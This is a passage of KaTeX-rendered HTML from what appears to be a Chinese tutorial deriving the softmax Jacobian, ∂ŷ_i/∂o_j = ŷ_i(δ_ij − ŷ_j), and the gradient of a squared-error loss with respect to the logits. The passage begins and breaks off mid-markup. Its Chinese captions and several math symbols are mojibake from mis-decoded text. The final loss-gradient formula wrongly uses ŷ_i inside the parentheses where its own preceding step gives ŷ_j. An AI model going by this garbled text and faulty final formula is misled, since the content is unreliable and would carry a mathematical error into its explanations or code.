<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mfrac><mi mathvariant="normal">âˆ‚</mi><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo stretchy="false">(</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mrow><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup></mrow></mfrac><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>0</mn><mo>â‹…</mo><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup><mo>âˆ’</mo><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup></mrow><mrow><mo stretchy="false">(</mo><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac><mo>=</mo><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\frac{\partial \hat{y_i}}{\partial o_j} = \frac{\partial}{\partial o_j}(\frac{e^{o_i}}{\sum_{k=1}^{m}e^{o_k}}) = \frac{0 \cdot \sum_{k=1}^{m}e^{o_k} - e^{o_i}e^{o_j}}{(\sum_{k=1}^{m}e^{o_k})^2} = -\hat{y_i}\hat{y_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.3654em;vertical-align:-0.994em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3414em;"><span style="top:-2.3057em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.994em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.488em;vertical-align:-0.994em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.494em;"><span style="top:-2.3057em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.6897em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.994em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"/><span class="mord">âˆ’</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></div>
<p><strong>ç»Ÿä¸€è¡¨è¾¾å¼ï¼š</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mtext>ï¼Œ</mtext><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.25em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mi>j</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>0</mn><mo separator="true">,</mo><mi>i</mi><mo mathvariant="normal">â‰ </mo><mi>j</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \hat{y_i}}{\partial o_j} = \hat{y_i}(\delta_{ij}-\hat{y_j})ï¼Œ \delta_{ij} = \left\{ \begin{aligned} 1, i =j \\ 0, i \neq j \end{aligned} \right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"/></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>æ‰€ä»¥æœ€ç»ˆçš„è¡¨è¾¾å¼ä¸ºï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>âˆ’</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j} = \sum_{i=1}^{m}(\hat{y_i} - y_i)\hat{y_i}(\delta_{ij}-\hat{y_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 